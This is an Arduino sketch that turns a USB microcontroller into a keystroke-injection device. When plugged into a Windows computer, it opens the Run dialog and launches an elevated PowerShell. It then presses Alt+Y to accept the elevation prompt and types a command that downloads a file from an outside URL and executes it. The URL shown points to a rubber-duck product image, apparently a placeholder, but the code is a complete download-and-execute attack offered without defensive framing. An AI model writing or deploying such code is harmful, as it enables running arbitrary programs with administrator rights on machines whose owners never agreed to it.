#include <Keyboard.h>
void setup() {
String url = "https://www.munchkin.com/media/catalog/product/3/1/31001_white_hot_safety_bath_ducky.jpg";
String file = "31001_white_hot_safety_bath_ducky.jpg";
Keyboard.begin();
delay(1000);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press(114);
Keyboard.releaseAll();
delay(200);
Keyboard.print("powershell Start-Process powershell -Verb runAs");
typeKey(KEY_RETURN);
delay(1000);
Keyboard.press(KEY_LEFT_ALT);
Keyboard.press(121);
Keyboard.releaseAll();
delay(200);
Keyboard.print("[Net.ServicePointManager]::SecurityProtocol = \"tls12, tls11, tls\"; $down = New-Object System.Net.WebClient; $url = '" + url +"'; $file = '" + file +"'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($PSScriptRoot + $file); exit;");
typeKey(KEY_RETURN);
Keyboard.end();
}
void typeKey(int key){
Keyboard.press(key);
delay(50);
Keyboard.release(key);
}
void loop() {}
